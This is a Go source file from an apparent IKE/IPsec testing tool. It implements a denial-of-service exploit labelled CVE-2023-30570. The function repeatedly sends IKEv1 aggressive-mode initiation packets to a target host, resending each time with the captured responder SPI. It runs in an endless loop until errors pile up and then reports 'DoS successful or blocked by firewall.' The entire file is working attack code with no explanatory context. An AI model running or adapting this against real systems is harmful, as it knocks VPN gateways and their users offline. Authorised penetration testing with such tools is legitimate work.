package exploits

import (
	"fmt"
	"time"

	"github.com/PhilipM-eu/ikepoke/internal/IKESession"
	"github.com/PhilipM-eu/ikepoke/internal/targets"
	"github.com/PhilipM-eu/ikepoke/internal/transforms"
)

func CVE202330570(srcIP, srcPort string, target *targets.Target, timeout int, verbose bool) {
	fmt.Println("Initiating a DoS attempt")
	sa := transforms.SingleSAIKEv1{
		EncAlgo:    1,
		KeyLength:  0,
		HashAlgo:   1,
		DhGroup:    2,
		AuthMethod: 1,
	}
	errorCounter := 0
	for {

		session := IKESession.NewSession(srcIP, srcPort, target.IP, target.Port, timeout, verbose)
		response, err := session.SendIKEv1InitAggressiveMode(map[uint16]uint16{sa.EncAlgo: sa.KeyLength}, sa.HashAlgo, sa.DhGroup, sa.AuthMethod)
		if err != nil {
			//fmt.Println("error while parsing", err)
			errorCounter++
			if errorCounter > 5 {
				break
			}

		} else {
			errorCounter = 0
		}
		session.ResponderSPI = response.Header.ResponderSPI
		_, err = session.SendIKEv1InitAggressiveMode(map[uint16]uint16{sa.EncAlgo: sa.KeyLength}, sa.HashAlgo, sa.DhGroup, sa.AuthMethod)
		if err != nil {
			errorCounter++
		}
		time.Sleep(time.Millisecond * 10)

	}
	fmt.Println("DoS successful or blocked by firewall.")
}
